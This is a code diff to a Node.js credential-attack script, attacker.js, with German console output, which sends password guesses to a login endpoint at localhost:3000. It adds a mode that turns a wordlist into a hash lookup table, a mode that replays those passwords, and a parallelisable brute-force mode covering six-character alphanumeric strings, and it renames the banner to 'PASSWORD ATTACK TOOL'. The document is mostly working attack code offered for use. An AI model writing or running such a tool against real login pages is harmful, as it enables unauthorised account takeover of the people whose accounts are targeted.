@@ -4,9 +4,7 @@ const crypto = require('crypto');
 const fetch = global.fetch || require('node-fetch');
 
 const TARGET_URL = 'http://localhost:3000/login';
-const DICT_PATH = path.resolve(__dirname, 'dictionary.txt');
 const RAINBOW_TABLE_PATH = path.resolve(__dirname, 'rainbow_table.json');
-const MAX_TRIES = 20000000;
 let found = false;
 
 const pLimit = (concurrency) => {
@@ -41,7 +39,6 @@ function buildRainbowTable(wordlist, outputPath, algorithm = 'sha256') {
     console.log(`Erstelle Rainbow Table mit ${algorithm}...`);
     const table = {};
     let count = 0;
-
     for (const password of wordlist) {
         const hash = generateHash(password, algorithm);
         table[hash] = password;
@@ -50,7 +47,6 @@ function buildRainbowTable(wordlist, outputPath, algorithm = 'sha256') {
             process.stdout.write(`\rGeneriert: ${count} Einträge`);
         }
     }
-
     console.log(`\n✓ Rainbow Table erstellt: ${count} Einträge`);
     fs.writeFileSync(outputPath, JSON.stringify(table, null, 2));
     console.log(`✓ Gespeichert: ${outputPath}`);
@@ -71,101 +67,27 @@ function loadRainbowTable(filePath) {
 async function tryWithRainbowTable(username, rainbowTable) {
     console.log('\n=== RAINBOW TABLE ANGRIFF ===');
     const passwords = Object.values(rainbowTable);
+    console.log(`Teste ${passwords.length} Passwörter aus Rainbow Table...`);
     const limit = pLimit(10);
+    let tested = 0;
     for (const password of passwords) {
         if (found) break;
         await limit(() => tryCandidate(password, username));
+        tested++;
+        if (tested % 100 === 0) {
+            process.stdout.write(`\rGetestet: ${tested}/${passwords.length}`);
+        }
     }
-}
-
-function splitWorkload(candidates, numInstances, instanceId) {
-    const chunkSize = Math.ceil(candidates.length / numInstances);
-    const start = instanceId * chunkSize;
-    const end = Math.min(start + chunkSize, candidates.length);
-    return candidates.slice(start, end);
+    console.log(`\nRainbow Table Angriff abgeschlossen: ${tested} Passwörter getestet`);
 }
 
 function getInstanceConfig() {
     const instanceId = parseInt(process.env.INSTANCE_ID || process.argv[4] || '0');
     const totalInstances = parseInt(process.env.TOTAL_INSTANCES || process.argv[5] || '1');
-    return { instanceId, totalInstances };
+    return {instanceId, totalInstances};
 }
 
-const USERNAME = process.argv[2];
-const MODE = process.argv[3] || 'normal';
-
-if (!USERNAME) {
-    console.error('Usage: node attacker.js <username> [mode] [instanceId] [totalInstances]');
-    console.error('Modes: normal, rainbow, parallel');
-    console.error('Beispiel parallel: node attacker.js admin parallel 0 4');
-    process.exit(1);
-}
-
-function safeMask(s) {
-    if (!s) return '';
-    return s.replace(/.(?=.{2})/g, '*');
-}
-
-const leetMap = {a: ['4', '@'], e: ['3'], i: ['1', '!'], o: ['0'], s: ['5', '$'], t: ['7']};
-
-function leetVariants(word) {
-    const res = new Set();
-    function helper(idx, cur) {
-        if (idx === word.length) {
-            res.add(cur);
-            return;
-        }
-        const ch = word[idx];
-        helper(idx + 1, cur + ch);
-        const low = ch.toLowerCase();
-        if (leetMap[low]) {
-            for (const sub of leetMap[low]) helper(idx + 1, cur + sub);
-        }
-    }
-    helper(0, '');
-    return Array.from(res);
-}
-
-function capsVariants(s) {
-    return new Set([s, s.toLowerCase(), s.toUpperCase(), s[0].toUpperCase() + s.slice(1)]);
-}
-
-function buildBaseWords() {
-    const words = new Set();
-    if (fs.existsSync(DICT_PATH)) {
-        const lines = fs.readFileSync(DICT_PATH, 'utf8').split(/\r?\n/).map(l => l.trim()).filter(Boolean);
-        lines.forEach(w => words.add(w));
-    }
-    return Array.from(words);
-}
-
-function expandWithMutations(baseWords) {
-    const out = new Set();
-    const commonSuffixes = ['!', '1', '123', '2020', '2021', '2022', '2023', '2024', '#'];
-    const specialInserts = ['!', '.', '_', '-', '@'];
-    for (const w of baseWords) {
-        for (const v of capsVariants(w)) {
-            out.add(v);
-            for (const s of commonSuffixes) out.add(v + s);
-            for (const l of leetVariants(v)) out.add(l);
-            out.add(v + '!');
-            out.add('!' + v);
-        }
-        out.add(w + '123');
-        out.add(w + '2023');
-        for (const c of specialInserts) out.add(w + c);
-    }
-    const arr = Array.from(out);
-    for (let i = 0; i < Math.min(200, arr.length); i++) {
-        for (let j = 0; j < Math.min(200, arr.length); j++) {
-            if (i === j) continue;
-            out.add(arr[i] + arr[j]);
-        }
-    }
-    return Array.from(out);
-}
-
-function* generateAndTest(charset, maxLen, startIdx = 0, skipCount = 1) {
+function* generateBruteForce(charset, maxLen, startIdx = 0, skipCount = 1) {
     let currentIdx = 0;
     for (let len = 1; len <= maxLen; len++) {
         const indices = Array(len).fill(0);
@@ -186,7 +108,26 @@ function* generateAndTest(charset, maxLen, startIdx = 0, skipCount = 1) {
     }
 }
 
-async function tryCandidate(candidate, username = USERNAME) {
+async function bruteForceAttack(username, charset, maxLen, instanceId, totalInstances) {
+    console.log('\n=== BRUTE FORCE ANGRIFF ===');
+    console.log(`Charset: ${charset.join('')}`);
+    console.log(`Max Länge: ${maxLen}`);
+    console.log(`Instance: ${instanceId + 1}/${totalInstances}`);
+    const generator = generateBruteForce(charset, maxLen, instanceId, totalInstances);
+    const limit = pLimit(10);
+    let tested = 0;
+    for (const candidate of generator) {
+        if (found) break;
+        await limit(() => tryCandidate(candidate, username));
+        tested++;
+        if (tested % 1000 === 0) {
+            process.stdout.write(`\rBrute-Force Versuche: ${tested}`);
+        }
+    }
+    console.log(`\nBrute Force abgeschlossen: ${tested} Kombinationen getestet`);
+}
+
+async function tryCandidate(candidate, username) {
     if (found) return false;
     const body = {username: username, password: candidate};
     try {
@@ -196,73 +137,77 @@ async function tryCandidate(candidate, username = USERNAME) {
             body: JSON.stringify(body)
         });
         if (resp.status === 200) {
-            console.log(`\n✓✓✓ FOUND password for ${username}: ${candidate}`);
+            console.log(`\n✓✓✓ PASSWORT GEFUNDEN für ${username}: ${candidate}`);
             found = true;
             return true;
-        } else {
-            return false;
         }
+        return false;
     } catch (err) {
-        console.error('Network error for candidate', safeMask(candidate), err.message);
+        console.error(`\nNetzwerkfehler: ${err.message}`);
         return false;
     }
 }
 
+const USERNAME = process.argv[2];
+const MODE = process.argv[3] || 'rainbow';
+if (!USERNAME) {
+    console.error('Usage: node attacker.js <username> <mode> [instanceId] [totalInstances]');
+    console.error('');
+    console.error('Modes:');
+    console.error('  rainbow    - Rainbow Table Angriff');
+    console.error('  bruteforce - Brute Force Angriff (parallelisierbar)');
+    console.error('  create     - Erstelle Rainbow Table aus wordlist.txt');
+    console.error('');
+    console.error('Beispiele:');
+    console.error('  node attacker.js admin rainbow');
+    console.error('  node attacker.js admin bruteforce 0 4    # Instanz 1 von 4');
+    console.error('  node attacker.js admin create');
+    process.exit(1);
+}
+
 (async () => {
-    console.log(`\n=== PASSWORD TESTING TOOL ===`);
+    console.log(`\n=== PASSWORD ATTACK TOOL ===`);
     console.log(`Target: ${TARGET_URL}`);
     console.log(`Username: ${USERNAME}`);
     console.log(`Mode: ${MODE}`);
-    const { instanceId, totalInstances } = getInstanceConfig();
-    if (MODE === 'parallel') {
-        console.log(`Instance: ${instanceId + 1}/${totalInstances}`);
+    const {instanceId, totalInstances} = getInstanceConfig();
+    if (MODE === 'create') {
+        console.log('\n=== RAINBOW TABLE ERSTELLEN ===');
+        const wordlistPath = path.resolve(__dirname, 'wordlist.txt');
+        if (!fs.existsSync(wordlistPath)) {
+            console.error(`Fehler: ${wordlistPath} nicht gefunden!`);
+            console.error('Erstelle eine wordlist.txt Datei mit Passwörtern (ein Passwort pro Zeile)');
+            process.exit(1);
+        }
+        const wordlist = fs.readFileSync(wordlistPath, 'utf8')
+            .split(/\r?\n/)
+            .map(line => line.trim())
+            .filter(Boolean);
+        console.log(`Wordlist geladen: ${wordlist.length} Einträge`);
+        buildRainbowTable(wordlist, RAINBOW_TABLE_PATH);
+        process.exit(0);
     }
     if (MODE === 'rainbow') {
         let rainbowTable = loadRainbowTable(RAINBOW_TABLE_PATH);
         if (!rainbowTable) {
-            console.log('Keine Rainbow Table gefunden. Erstelle neue...');
-            const base = buildBaseWords();
-            const candidates = expandWithMutations(base);
-            rainbowTable = buildRainbowTable(candidates, RAINBOW_TABLE_PATH);
+            console.error('\nKeine Rainbow Table gefunden!');
+            console.error('Erstelle zuerst eine Rainbow Table mit: node attacker.js <user> create');
+            process.exit(1);
         }
         await tryWithRainbowTable(USERNAME, rainbowTable);
-        process.exit(found ? 0 : 1);
-    }
-    const base = buildBaseWords();
-    console.log('Base words aus Dictionary:', base.slice(0, 10).join(', '));
-    let candidates = expandWithMutations(base);
-    console.log(`Generiert: ${candidates.length} Kandidaten`);
-    const common = ['password', '123456', 'qwerty', 'letmein', 'welcome', 'admin', 'admin123'];
-    candidates = candidates.concat(common);
-    if (MODE === 'parallel' && totalInstances > 1) {
-        candidates = splitWorkload(candidates, totalInstances, instanceId);
-        console.log(`Diese Instanz verarbeitet: ${candidates.length} Kandidaten (${instanceId * 100 / totalInstances}% - ${(instanceId + 1) * 100 / totalInstances}%)`);
-    }
-    if (candidates.length > MAX_TRIES) candidates = candidates.slice(0, MAX_TRIES);
-    const limit = pLimit(10);
-    let tested = 0;
-    for (const c of candidates) {
-        if (found) break;
-        await limit(() => tryCandidate(c));
-        tested++;
-        if (tested % 100 === 0) {
-            process.stdout.write(`\rGetestet: ${tested}/${candidates.length}`);
-        }
-    }
-    if (!found) {
-        console.log('\n\nKein Match in Dictionary/Mutation-Phase.');
-        console.log('Starte Brute-Force...');
+    } else if (MODE === 'bruteforce') {
+        console.log(`Instance: ${instanceId + 1}/${totalInstances}`);
         const charset = '0123456789abcdefghijklmnopqrstuvwxyz'.split('');
-        const gen = generateAndTest(charset, 32, instanceId, totalInstances);
-        let tries = 0;
-        for (const candidate of gen) {
-            if (found) break;
-            tries++;
-            if (tries % 1000 === 0) process.stdout.write(`\rBrute-Force: ${tries} versuche`);
-            await limit(() => tryCandidate(candidate));
-        }
+        const maxLen = 6;
+        await bruteForceAttack(USERNAME, charset, maxLen, instanceId, totalInstances);
+    } else {
+        console.error(`Unbekannter Mode: ${MODE}`);
+        console.error('Verwende: rainbow, bruteforce, oder create');
+        process.exit(1);
     }
-    console.log('\n\n=== FERTIG ===');
-    if (!found) console.log('Passwort nicht gefunden (innerhalb der Limits).');
+    console.log('\n=== FERTIG ===');
+    if (!found) {
+        console.log('Passwort nicht gefunden.');
+    }
     process.exit(found ? 0 : 1);
 })();
